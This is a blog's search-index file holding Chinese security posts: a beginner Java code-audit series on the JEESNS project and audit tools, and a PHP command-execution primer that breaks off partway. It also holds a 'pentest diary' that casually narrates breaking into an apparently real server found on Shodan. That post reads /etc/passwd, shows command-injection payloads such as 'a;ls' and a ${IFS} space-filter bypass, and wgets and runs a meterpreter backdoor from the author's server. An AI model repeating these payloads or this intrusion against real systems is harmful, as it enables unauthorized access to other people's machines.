<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>从1开始的Java代码审计·第二弹·基础篇（下）</title>
      <link href="/2018/10/29/java-audit-step-by-step-2/"/>
      <url>/2018/10/29/java-audit-step-by-step-2/</url>
      
        <content type="html"><![CDATA[<p>我们在审计一个项目的时候，最开始应该是先熟悉项目的结构，了解项目的技术栈。</p><p>本篇，我会引入一个开源的 Java Web 项目，通过实例分析 Java Web 的项目结构，常用的 MVC 模式。</p><a id="more"></a><h1 id="JEESNS"><a href="#JEESNS" class="headerlink" title="JEESNS"></a>JEESNS</h1><p><a href="https://github.com/zchuanzhao/jeesns" target="_blank" rel="noopener">JEESNS</a>，是一款基于 JAVA 企业级平台研发的社交管理系统，在 github 上有 200+ star，在开源的 Java Web 项目中算是还不错的了。在本章及后面的内容，我会用它做实例，进行审计分析。</p><p>项目地址： <a href="https://github.com/zchuanzhao/jeesns" target="_blank" rel="noopener">https://github.com/zchuanzhao/jeesns</a></p><h2 id="下载项目"><a href="#下载项目" class="headerlink" title="下载项目"></a>下载项目</h2><p>你可以直接把项目 clone 下来，然后导入到 IDE。也可以直接在 IDEA 里把项目从 VCS（版本控制系统）中 checkout 出来。</p><p>下面我演示下，如何在 IDEA 里直接从 git 服务器上迁出项目。</p><ol><li><p>打开 IDEA，点<code>Check out from Version Control</code>，选择<code>Git</code>。<br><img src="/2018/10/29/java-audit-step-by-step-2/check1.png" alt="check1"></p></li><li><p>在弹出的 dialog 里，输入 git 的地址(<a href="https://github.com/zchuanzhao/jeesns.git)，以及本地保存的位置，然后`clone`。" target="_blank" rel="noopener">https://github.com/zchuanzhao/jeesns.git)，以及本地保存的位置，然后`clone`。</a><br><img src="/2018/10/29/java-audit-step-by-step-2/check2.png" alt="check2"></p></li><li><p>之后，IDEA 会开始下载项目，并构建，下面是构建完毕的项目工程。<br><img src="/2018/10/29/java-audit-step-by-step-2/check3.png" alt="check3"></p></li></ol><hr><h1 id="项目结构解析"><a href="#项目结构解析" class="headerlink" title="项目结构解析"></a>项目结构解析</h1><h2 id="Maven"><a href="#Maven" class="headerlink" title="Maven"></a>Maven</h2><h3 id="根目录下的-pom-xml"><a href="#根目录下的-pom-xml" class="headerlink" title="根目录下的 pom.xml"></a>根目录下的 pom.xml</h3><p>在项目的根目录下，有一个<code>pom.xml</code>的文件，这个文件的存在，表明项目是用<code>Maven</code>构建的，<a href="http://www.runoob.com/maven/maven-tutorial.html" target="_blank" rel="noopener">关于 Maven 可以点这里</a>。它是用来管理项目源码、配置文件，不过最大的用处还是处理<strong>项目的依赖关系</strong>。作用有点类似于 nodejs 的 npm，python 的 pip。</p><p>下面，点开这个<code>pom.xml</code>。</p><p><img src="/2018/10/29/java-audit-step-by-step-2/maven1.png" alt="maven1"></p><p>红框的 ① 处，描述了这个项目的开发组织，项目名称，项目版本。</p><p>② 处，用的是<code>modules</code>标签，说明这是一个多模块项目。在左边的导航栏，可以看到确实有许多子模块。</p><blockquote><p>多模块项目是为了在项目开发中便于后期维护，所以采用分层开发的方法，这样各个模块的职责会比较的明确，维护起来相对容易。在打包时，只要对父模块打包即可，子模块会自动合并进来。</p></blockquote><p>③ 处，是 maven 在构建时相关的配置，这里用了一个 compiler 插件，表示源码用的是<code>1.7</code>的<code>JDK</code>并且生成的目标字节码文件也要是<code>1.7</code>的。</p><h3 id="子模块下的-pom-xml"><a href="#子模块下的-pom-xml" class="headerlink" title="子模块下的 pom.xml"></a>子模块下的 pom.xml</h3><p>点开每个子模块，看到每个模块下还会有一个<code>pom.xml</code>。</p><p><img src="/2018/10/29/java-audit-step-by-step-2/maven2.png" alt="maven2"></p><p>随便点一个<code>pom.xml</code>，它和根目录下的<code>pom.xml</code>有所不同，多了一个<code>&lt;parent&gt;</code>标签，和<code>dependencies</code>。</p><p><code>&lt;parent&gt;</code>标签，表示这个子模块，将上级的<code>jeesns</code>项目作父模块。</p><p><code>dependencies</code>，描述了这个模块的依赖关系。当前的<code>web</code>模块依赖于子模块<code>core</code>,<code>model</code>,<code>service</code>,<code>common</code>。而子模块<code>core</code>里，依赖于许多的第三方库，包括<code>Spring</code>、<code>MyBatis</code>、<code>apache-commons</code>等。它们都继承了上级的<code>jeesns</code>父模块，在逻辑上同属一个项目。</p><blockquote><p>相关文章 <a href="https://www.cnblogs.com/davenkin/p/advanced-maven-multi-module-vs-inheritance.html" target="_blank" rel="noopener">https://www.cnblogs.com/davenkin/p/advanced-maven-multi-module-vs-inheritance.html</a></p></blockquote><h2 id="第三方库的安全检查"><a href="#第三方库的安全检查" class="headerlink" title="第三方库的安全检查"></a>第三方库的安全检查</h2><p>前面有说过，<code>pom.xml</code>有个重要的作用是管理依赖关系。在<code>&lt;dependencies&gt;</code>中填写要引入的第三方库信息，<code>Maven</code>在<code>import</code>时，会从<code>仓库</code>下载相关的库文件，加入到当前项目。</p><p>我们需要<code>&lt;dependencies&gt;</code>中，检查使用的第三方库是否有已知的安全漏洞。<br>这里只要根据组件名称、版本号，去官网或者<code>CVE</code>漏洞库搜下就行了。如果项目很大，引入了太多库，这也是件很累的事情。</p><p>所以 OWASP 出了一个工具 <a href="https://www.owasp.org/index.php/OWASP_Dependency_Check" target="_blank" rel="noopener"><code>Dependency_Check</code></a> 专门检查这类问题，这个工具的使用在前面一篇已经讲过了，就不多介绍了。</p><h2 id="子模块"><a href="#子模块" class="headerlink" title="子模块"></a>子模块</h2><p><code>JEESNS</code> 一共分了六个子模块，分别是 <code>jeesns-common</code>、<code>jeesns-core</code>、<code>jeesns-dao</code>、<code>jeesns-model</code>、<code>jeesns-service</code>、<code>jeesns-web</code>。</p><p>接下来，我们来分析各个子模块的作用。</p><h3 id="jeesns-core"><a href="#jeesns-core" class="headerlink" title="jeesns-core"></a>jeesns-core</h3><p>看名字就知道，这是这套 Web 程序的核心部分。</p><p>通过分析 <code>pom.xml</code> 文件，发现它引入了以下第三方库：</p><table><thead><tr><th>库名</th><th>用途</th></tr></thead><tbody><tr><td>spring-*</td><td>spring 框架相关</td></tr><tr><td>freemarker</td><td>前端模板引擎</td></tr><tr><td>httpclient</td><td>http 客户端</td></tr><tr><td>mysql-connector</td><td>mysql 连接器驱动</td></tr><tr><td>c3p0</td><td>数据库连接池</td></tr><tr><td>mybatis</td><td>半自动 ORM 框架</td></tr><tr><td>hibernate-validator</td><td>数据有效性验证</td></tr><tr><td>jackson</td><td>json 数据处理库</td></tr><tr><td>jsoup</td><td>html 解析器</td></tr><tr><td>log4j</td><td>日志管理框架</td></tr><tr><td>commons-io</td><td>io 工具类</td></tr><tr><td>commons-codec</td><td>编码处理工具类</td></tr><tr><td>commons-lang</td><td>Java 基本对象工具类</td></tr><tr><td>commons-fileupload</td><td>提供文件上传功能</td></tr><tr><td>commons-logging</td><td>提供 Java 日志接口</td></tr></tbody></table><p>根据上表，即使我们不看官方的介绍，也基本可以确定这套程序的技术栈。</p><p>主要使用了 <code>SSM框架</code> (Spring+SpringMVC+MyBatis)， <code>freemarker</code> 模板引擎，支持 <code>MySQL</code> 数据库，使用 <code>c3p0</code> 连接池，<code>jackson</code> 处理 <code>json</code> 数据，<code>hibernate-validator</code> 对用户传来的请求数据进行有效性验证，还有一些 <code>apache</code> 提供的工具类。</p><h4 id="包结构"><a href="#包结构" class="headerlink" title="包结构"></a>包结构</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">- core</span><br><span class="line"></span><br><span class="line">  - annotation 定义注解</span><br><span class="line"></span><br><span class="line">  - consts 定义常量</span><br><span class="line"></span><br><span class="line">  - directive 定义了一个抽象类 `BaseDirective` ，所有的标签类都会继承它</span><br><span class="line"></span><br><span class="line">  - dto 定义`响应结果`的数据传输模型</span><br><span class="line"></span><br><span class="line">  - enums 定义功能相关的常量</span><br><span class="line"></span><br><span class="line">  - exception 定义异常</span><br><span class="line"></span><br><span class="line">  - filter 定义过滤器，目前只有一个`XSS`过滤器</span><br><span class="line"></span><br><span class="line">  - handler 定义处理器，目前只有`DirectiveHandler`，负责处理每个页面的渲染</span><br><span class="line"></span><br><span class="line">  - model 定义了数据模型，这里只有`Page`，描述页面对象，用于数据分页情况</span><br><span class="line"></span><br><span class="line">  - utils 定义工具类</span><br><span class="line"></span><br><span class="line">+ interceptor</span><br><span class="line"></span><br><span class="line">  - PageInterceptor 分页拦截器，处理需要分页的请求。</span><br></pre></td></tr></table></figure><h4 id="模块小结"><a href="#模块小结" class="headerlink" title="模块小结"></a>模块小结</h4><p>通过分析 <code>jeesns-core</code> 的模块，我们已经知道了 <code>jeesns</code> 的技术栈，是目前比较流行的 <code>SSM</code> 框架，这个核心模块给整个项目构建了一个基本骨架，包括功能方面的还有我们关心的安全方面的（虽然只有 <code>XSS</code> 防御 <code>($ _ $)</code> ）。</p><p>在分析下面模块之前，我们需要先了解 <code>SSM</code> 的一些概念。<a href="https://www.cnblogs.com/zyw-205520/p/4771253.html" target="_blank" rel="noopener">参考文章</a></p><p>当然，最重要的还是要知道什么是 <code>MVC</code>，因为大部分的 <code>Web</code> 项目，都是基于这种<code>设计模式</code>开发的，包括 <code>JEESNS</code> 。<a href="https://blog.csdn.net/qq_26411021/article/details/79493340" target="_blank" rel="noopener">参考文章</a></p><blockquote><p>设计模式与编程语言无关，可以说是一套经验科学，由前人总结、分类，被广泛使用。目的是为了代码可重用性、让代码更容易被他人理解、保证代码可靠性。</p></blockquote><blockquote><blockquote><p><code>Java</code> 设计模式学习链接：<a href="https://github.com/AlfredTheBest/Design-Pattern" target="_blank" rel="noopener">https://github.com/AlfredTheBest/Design-Pattern</a></p></blockquote></blockquote><p>如果，你已经了解了<code>SSM</code>、<code>MVC</code>的概念，那就接着往下看吧 <code>O(∩_∩)O</code> 。</p><h3 id="jeesns-web"><a href="#jeesns-web" class="headerlink" title="jeesns-web"></a>jeesns-web</h3><p>对应 <code>MVC</code> 中的 <code>Controller</code> 层，负责具体业务的模块流程的控制，会调用到下面 <code>Service</code> 层的接口来控制业务流程。</p><p><code>webapp</code> 里是 <code>View</code> 层用到的静态资源（js、css、jpg）以及<code>freemarker</code>的模板文件。</p><p><code>resources</code> 里，有项目相关的各种配置文件。</p><h4 id="模块小结-1"><a href="#模块小结-1" class="headerlink" title="模块小结"></a>模块小结</h4><p><code>Controller</code> 层和 <code>View</code> 层结合的最紧密，两者通常协同开发。</p><p>这里的 <code>Controller</code> 层还设置了<code>监听器</code>，负责对用户的身份和权限进行认证管理。</p><blockquote><p>通常在 Java Web 里，我们会用 <code>Spring-Security</code> 或 <code>Shiro</code> 这些第三方库来帮助我们实现<strong>用户认证和用户授权</strong>的功能 。</p></blockquote><h3 id="jeesns-service"><a href="#jeesns-service" class="headerlink" title="jeesns-service"></a>jeesns-service</h3><p><code>Service</code> 层，主要负责业务模块的应用逻辑应用设计，先设计接口，在设计实现类。这一层，是纯业务逻辑。在使用 <code>Service</code> 层时，会继续调用下面的 <code>DAO</code> 层的接口。</p><h3 id="jeesns-dao"><a href="#jeesns-dao" class="headerlink" title="jeesns-dao"></a>jeesns-dao</h3><p><code>DAO</code> 层，负责数据持久化，通俗点说就是用来和数据库交互，读写数据的模块。</p><p>前面有说到，<code>JEESNS</code> 用了 <code>MyBatis</code> 作为数据持久化框架。<code>MyBatis</code> 属于半自动 <code>ORM</code> ，它会帮我们自动将数据查询结果映射到对象，但是数据查询的 <code>SQL</code> 语句还是要我们自己手写，这点和其它的 <code>ORM</code> 明显的不一样。</p><p><code>MyBatis</code> 的使用方式主要有两种，一种是使用<code>注解</code>，直接将<code>SQL</code>语句和<code>方法</code>绑定在一起，像下面这样：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.mybatis.example;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">BlogMapper</span> </span>&#123;</span><br><span class="line">  <span class="meta">@Select</span>(<span class="string">"SELECT * FROM blog WHERE id = #&#123;id&#125;"</span>)</span><br><span class="line">  <span class="function">Blog <span class="title">selectBlog</span><span class="params">(<span class="keyword">int</span> id)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种方式，适合简单的<code>SQL</code>语句，一旦语句长了，注释会变得复杂混乱，维护起来很麻烦，所以它只适合小项目（小项目用的也不多）。</p><p>用的最多的是第二种——<code>XML</code>配置，将<code>SQL</code>语句和<code>Java</code>代码分离，有独立的<code>xml</code>文件，描述某个方法会和某个<code>SQL</code>语句绑定。</p><p><img src="/2018/10/29/java-audit-step-by-step-2/mybatis1.png" alt="mybatis1"></p><p>如图，每一个接口，在资源文件目录中，都有对应的<code>xml</code>。接口中的方法，和<code>xml</code>中<code>id</code>相同的<code>SQL</code>语句关联。</p><p>例如，<code>IArticleCateDao</code> 的 <code>list()</code>方法被调用，那么就会找到 <code>ArticleCateMapper.xml</code>中 <code>id</code>等于 <code>list</code> 的方法，执行它的 <code>SQL</code>，然后根据 <code>resultMap</code> 描述的 <em>字段-属性</em> 映射关系，返回相应的实例对象。</p><p>这里的 <code>resultMap</code> 具体如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">"ArticleCateResult"</span> <span class="attr">type</span>=<span class="string">"ArticleCate"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">"id"</span> <span class="attr">jdbcType</span>=<span class="string">"INTEGER"</span> <span class="attr">property</span>=<span class="string">"id"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"fid"</span> <span class="attr">jdbcType</span>=<span class="string">"INTEGER"</span> <span class="attr">property</span>=<span class="string">"fid"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"name"</span> <span class="attr">jdbcType</span>=<span class="string">"VARCHAR"</span> <span class="attr">property</span>=<span class="string">"name"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"status"</span> <span class="attr">jdbcType</span>=<span class="string">"INTEGER"</span> <span class="attr">property</span>=<span class="string">"status"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"sort"</span> <span class="attr">jdbcType</span>=<span class="string">"INTEGER"</span> <span class="attr">property</span>=<span class="string">"sort"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中，<code>id</code>属性是该映射的名称，<code>type</code>属性代表映射的类。里面有 <code>5</code> 个子元素，<code>id</code>元素映射到<code>ArticleCate</code>的<code>id</code>属性。其它四个<code>result</code>元素中的<code>column</code>属性会映射到对应的<code>property</code>属性。</p><h4 id="模块小结-2"><a href="#模块小结-2" class="headerlink" title="模块小结"></a>模块小结</h4><p><code>dao</code> 模块负责数据的持久化，会和数据库交互。开发者编写的<code>SQL</code>语句也定义在这个模块，<code>MyBatis</code>有特殊的语法将查询的参数代入到<code>SQL</code>语句中，如果开发者在这里使用的语法有问题，就有极有可能出现 <code>SQL注入</code>。</p><h3 id="jeesns-model"><a href="#jeesns-model" class="headerlink" title="jeesns-model"></a>jeesns-model</h3><p>定义了所有和功能业务相关的数据模型，和数据库表对应。</p><h3 id="jeesns-common"><a href="#jeesns-common" class="headerlink" title="jeesns-common"></a>jeesns-common</h3><p>定义了其它模块会用到的常量以及工具类。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本篇主要以 <code>JEESNS</code> 为例，介绍了目前比较流行的 <code>Java Web</code> 项目的结构。</p><p>理清项目结构后，我们就可以继续下一步——漏洞挖掘啦。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>从1开始的Java代码审计·第一弹·基础篇（上）</title>
      <link href="/2018/10/25/java-audit-step-by-step-1/"/>
      <url>/2018/10/25/java-audit-step-by-step-1/</url>
      
        <content type="html"><![CDATA[<h1 id="基本环境"><a href="#基本环境" class="headerlink" title="基本环境"></a>基本环境</h1><h2 id="JDK"><a href="#JDK" class="headerlink" title="JDK"></a>JDK</h2><p>目前，<code>JDK</code>已经出到<code>11</code>了，<code>JDK</code>每个版本都会有些新特性出来。很多情况下<code>JDK</code>并不向下兼容，导致一些软件在较新的<code>JDK</code>中无法正常运行，所以推荐用现在比较主流的<code>JDK8</code>。而且有些漏洞需要在低版本的<code>JDK</code>上才能复现出来，比如反序列化用到的<code>JNDI Bean Property</code>类型的<code>Gadget</code>，需要在小于<code>JDK8_113</code>的版本下才可以利用，所以在安装的时候建议再安装一个低版本的JDK。JDK安装时自带的控制面板程序，可以帮助我们很方便的切换版本。</p><a id="more"></a><p><img src="/2018/10/25/java-audit-step-by-step-1/jdk_ctl.png" alt="jdk-ctl"></p><h2 id="IDE"><a href="#IDE" class="headerlink" title="IDE"></a>IDE</h2><p>做任何一门语言的代码审计，一个强大的IDE是必不可少的，好的IDE可以极大提高我们审计的效率。写Java的程序及代码审计，我推荐使用JetBrains家的<a href="https://www.jetbrains.com/idea/" target="_blank" rel="noopener"><code>Intelij IDEA</code></a>（JB大法好 O(∩_∩)O ），内置的代码检查工具比Eclipse强太多了，而且有很多的插件支持。</p><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>常见的数据库有 MySQL、PostgreSQL、Oracle，除此之外还有现在比较流行的非关系型数据库 Redis、Mongodb、Memcached 等等，有些数据库安装起来可能比较麻烦，不用一次性装完，有需要的时候再去装就行了。</p><h2 id="Web-容器"><a href="#Web-容器" class="headerlink" title="Web 容器"></a>Web 容器</h2><p><code>Java Web</code>应用在开发完后，通常会以<code>war</code>包的形式发布，我们需要把这个<code>war</code>包部署到自己的<code>Web容器</code>（也可以说是Web服务器）里去，容器在启动后会自动解压<code>war</code>包，处理用户发来的HTTP请求，将<code>jsp</code>编译成<code>servlet</code>，管理<code>servlet</code>的整个生命周期。</p><p>常见的 Web 容器有 Tomcat，JBoss，Jetty，Weblogic，不同的容器在功能、性能上有所差异，但仅仅是做代码审计用<a href="http://tomcat.apache.org/" target="_blank" rel="noopener"><code>Tomcat</code></a>就足够了。</p><hr><h1 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h1><h2 id="依赖检查"><a href="#依赖检查" class="headerlink" title="依赖检查"></a>依赖检查</h2><p>一个完整的Java项目，必然会引入一些外部的第三方库。这些库如果出了安全漏洞，会给应用带来巨大的风险。比如经常爆洞的<code>struts2</code>，以及最近几年很火的Java反序列化漏洞相关的<code>fastjson</code>,<code>jackson</code>,<code>apache-commons-collections</code>等等。如果开发者在开发的时候，没有对引入的库做安全检查，或者是直接从代码库里拉出来的依赖配置，那么很可能会引入过时了很久的库版本，带来安全隐患。在 OWASP TOP10 中有讲到这一类型的安全风险。</p><blockquote><p>参考 <a href="https://www.owasp.org/index.php/Top_10_2013-A9-Using_Components_with_Known_Vulnerabilities" target="_blank" rel="noopener"><code>OWASP TOP10 A9</code></a></p></blockquote><p>推荐一个工具，OWASP 出的 <a href="https://www.owasp.org/index.php/OWASP_Dependency_Check" target="_blank" rel="noopener"><code>Dependency_Check</code></a>，可以自动帮我们检查，引入的第三方库是否有已知的安全漏洞。</p><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><h4 id="插件模式"><a href="#插件模式" class="headerlink" title="插件模式"></a>插件模式</h4><p>作为 maven 的插件使用，用法很简单，直接在项目的 <code>pom.xml</code> 写入</p><pre><code><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.owasp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>dependency-check-maven<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.3.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">goal</span>&gt;</span>check<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure>然后，执行 `mvn verify` 就可以了。</code></pre><h4 id="命令行模式"><a href="#命令行模式" class="headerlink" title="命令行模式"></a>命令行模式</h4><p>我更喜欢以独立的命令行模式来运行，这样就不用进IDE额外修改 <code>pom.xml</code> 配置了。</p><ol><li><p>进入项目的github，<a href="https://github.com/jeremylong/DependencyCheck/releases" target="_blank" rel="noopener"><code>DependencyCheck</code></a>，找到最新的那版，下载下来。</p></li><li><p>解压出来，进到bin目录，有两个文件，分别对应windows版和linux版。</p></li></ol><p><img src="/2018/10/25/java-audit-step-by-step-1/bin_directory.png" alt="bin目录"></p><ol start="3"><li>进到命令行下，执行 <code>dependency-check.bat --project 项目名 --out 输出名 -s 源码路径</code> 即可，程序会自动从NVD更新漏洞库，所以需要点时间（应该还要翻墙）。</li></ol><p><img src="/2018/10/25/java-audit-step-by-step-1/exec_dc.png" alt="执行过程"></p><ol start="4"><li>扫描完毕后，会输出一份报告，如下：</li></ol><p><img src="/2018/10/25/java-audit-step-by-step-1/result_dc.png" alt="扫描结果"></p><h2 id="FindSecBugs"><a href="#FindSecBugs" class="headerlink" title="FindSecBugs"></a>FindSecBugs</h2><p><a href="https://find-sec-bugs.github.io" target="_blank" rel="noopener">FindSecBugs</a> 是专门用于检测Java Web应用安全漏洞的插件，支持多种IDE，还可以和SonarQube等代码分析平台集成。</p><h3 id="使用方法-1"><a href="#使用方法-1" class="headerlink" title="使用方法"></a>使用方法</h3><p>安装方法官网讲的很详细了，<a href="https://github.com/find-sec-bugs/find-sec-bugs/wiki/IntelliJ-Tutorial" target="_blank" rel="noopener">IDEA中安装FindSecBugs</a>。</p><p>这里主要讲IDEA中如何使用<code>FindSecBugs</code>。</p><p>IDEA打开要审计的项目以后，先点开 FindBugs-IDEA 标签，然后点左边的这个带绿色旗帜的文件夹logo，插件就会自动对项目进行审计。</p><p><img src="/2018/10/25/java-audit-step-by-step-1/exec_fsb.png" alt="开始扫描"></p><p><img src="/2018/10/25/java-audit-step-by-step-1/result_fsb.png" alt="扫描结果"></p><p>看这个项目的扫描结果，发现了 5 处安全bug，其中四处是文件的操作可能被用户控制，造成任意文件删除。当然，这也可能是误报，需要人工来再次确认。不过，这已经给我们的审计工作带来了很大的便利了（。＾▽＾）。</p><h2 id="抓包改包"><a href="#抓包改包" class="headerlink" title="抓包改包"></a>抓包改包</h2><p>做Java Web审计时，可能要结合黑盒的方法，动态调试。这时候就需要抓包改包的工具，发送自定义的HTTP包。这个功能很多工具都有，burpsuite，zap，postman，fiddler都可以用。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>从1开始的Java代码审计·序</title>
      <link href="/2018/10/25/java-audit-step-by-step-0/"/>
      <url>/2018/10/25/java-audit-step-by-step-0/</url>
      
        <content type="html"><![CDATA[<p>小组经常有小伙伴问我<code>Java</code>该怎么审计，其实我也挺头大的。因为我觉得审<code>Java</code>的代码和审<code>PHP</code>的代码，相差不大。WEB 漏洞就那些，只是换了门语言实现而已，只要漏洞原理知道了，审起来是很容易的。</p><p>很多学安全的同学，应该是从<code>PHP</code>入门的。<code>PHP</code>作为一门脚本语言，跨平台、语法简单、易上手、开源框架多、用户量大。但是，<code>PHP</code>语言本身的特性，它在后期的拓展和维护困难，而且支持所有漏洞（抖个机灵）。很多对系统稳定性、安全性要求较高的厂商不太会去选择<code>PHP</code>，而是<code>Java</code>或者别的语言。</p><p><code>Java</code>是纯正的面向对象的语言，适合团队协作开发，重构、维护相对轻松，语言生态好，且在高性能、高并发、分布式的场景吊打某语言。（虽然<code>PHP</code>也是支持面向对象的写法，不过身边真的在用面向对象的方法写<code>PHP</code>的同学真的很少，可能是不太理解面向对象的概念，也可能是因为写起来代码太长了？）</p><p>目前，网上关于 WEB 代码审计的文章很多都是<code>PHP</code>的，和<code>Java</code>相关的很少，而且质量一般。所以我打算做一个<code>Java</code>代码审计的系列，分享<code>Java</code>代码审计相关的小姿势。</p><p>在这个系列里，我假设每个读者都对 Java 和 WEB 安全方面的知识都有一定的了解，所以可能不会对漏洞的原理做很深的分析。</p><p>如果你觉得看起来有些累，或者对某个漏洞不理解，建议先去找些相关资料学习下。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>渗透日记-20181005</title>
      <link href="/2018/10/05/pentest-20181005/"/>
      <url>/2018/10/05/pentest-20181005/</url>
      
        <content type="html"><![CDATA[<p>在 shodan 上搜到一个有趣的站，名字就叫 webshell。</p><p><img src="/2018/10/05/pentest-20181005/1.png" alt="1"></p><p>根据提示</p><blockquote><p>Nothing specify params. Try to use “?file=” or “?id=time” to read a stream.</p></blockquote><p>可以通过 file 参数读取文件内容。</p><p>尝试读取 /etc/passwd 成功。</p><a id="more"></a><p><img src="/2018/10/05/pentest-20181005/2.png" alt="2"></p><p>尝试执行命令，<code>a;ls</code>，成功。</p><p><img src="/2018/10/05/pentest-20181005/3.png" alt="3"></p><p>但是但我尝试读取上级目录的时候，<code>a;ls ..</code>，失败。</p><p><img src="/2018/10/05/pentest-20181005/4.png" alt="4"></p><p>尝试了很多方法，最后发现，可能是空格失效了。</p><p>找到 l3m0n 师傅的命令执行绕过技巧，尝试 <code>&lt;&gt;</code> <code>${IFS}</code> 替代空格。</p><p>执行成功。</p><p><img src="/2018/10/05/pentest-20181005/5.png" alt="5"></p><p>接下来，就可以弹一个shell回来，然后为所欲为啦。 （。＾▽＾）</p><p>不过我喜欢用 msf ，那就先在自己服务器的 web 目录写一个 meterpreter 的后门。</p><p>再 wget 下来后运行。</p><p><img src="/2018/10/05/pentest-20181005/6.png" alt="6"></p><p><img src="/2018/10/05/pentest-20181005/7.png" alt="7"></p><p>成功连上。</p><p><img src="/2018/10/05/pentest-20181005/8.png" alt="8"></p><p>Ubuntu 16.04 内核 <code>4.4.0-77</code>，<code>CVE-2017-16995</code> 应该可以直接提权，不过是国内的机器，也没什么太多有意思的东西，就不深入了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Pentest </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PHP中的命令执行</title>
      <link href="/2018/09/18/summary-command-execution/"/>
      <url>/2018/09/18/summary-command-execution/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在 PHP 中, <code>exec()</code>、<code>system()</code>、<code>popen()</code>、<code>passthru()</code>、<code>proc_open()</code>、<code>pcntl_exec()</code>、<code>shell_exec()</code>，还有反引号 ``包裹的内容，都可以用来执行系统命令。</p><p>如果执行的命令参数是用户可控的，那么就会造成命令执行漏洞。</p><p>下面是常见的函数描述：</p><ul><li><p>system()</p><p>  输出并返回最后一行shell结果。 </p></li><li><p>exec()</p><p>  不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面。</p></li><li><p>passthru()</p><p>  只调用命令，把命令的运行结果原样地直接输出到标准输出设备上。</p></li><li><p>popen()、proc_open()</p><p>  不会直接返回执行结果，而是返回一个文件指针。</p></li><li><p>反引号</p><p>  调用 <code>shell_exec()</code> 函数</p></li></ul><a id="more"></a><hr><h2 id="各平台的漏洞利用"><a href="#各平台的漏洞利用" class="headerlink" title="各平台的漏洞利用"></a>各平台的漏洞利用</h2><p>在实际场景中，要利用命令执行漏洞，通常需要借助管道符，拼接到正常的命令参数中来实现。</p><p>各个平台支持的管道符都有所不同，下面是 <code>Windows</code> 及 